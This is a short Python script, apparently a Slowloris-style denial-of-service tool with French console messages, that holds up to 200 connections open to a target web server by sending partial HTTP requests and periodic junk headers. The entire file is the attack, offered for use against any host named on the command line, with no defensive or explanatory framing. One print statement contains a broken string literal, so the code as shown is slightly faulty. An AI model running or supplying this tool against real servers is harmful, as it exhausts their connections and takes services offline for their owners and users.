"""
author: ZakyHamdoun
"""

import socket
import random
import time
import sys

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]

sockets = []

def initSocket(ip):
    """
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, 80))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))

    for header in headers:
        s.send("{}\r\n".format(header).encode("utf-8"))

    return s

if __name__ == "__main__": #START
    if len(sys.argv) != 2:
        print("Utiliser le programme de la manière suivante : python {} example.com".format(sys.argv[0]))
        sys.exit()

    ip = sys.argv[1]
    count = 200
    print("Début d'envoi des socket {}. Connection à l'adresse. {} sockets.".format(ip, count))

    for _ in range(count):
        try:
            print("Socket {}".format(_))
            s = initSocket(ip)
        except socket.error:
            break

        sockets.append(s)

    while True:
        print("Connecté à {} sockets. Sending headers.format(len(sockets)))

        for s in list(sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets.remove(s)

        for _ in range(count - len(sockets)):
            print("Réouverture des sockets fermés en cours...")
            try:
                s = initSocket(ip)
                if s:
                    sockets.append(s)
            except socket.error:
                break

        time.sleep(15)
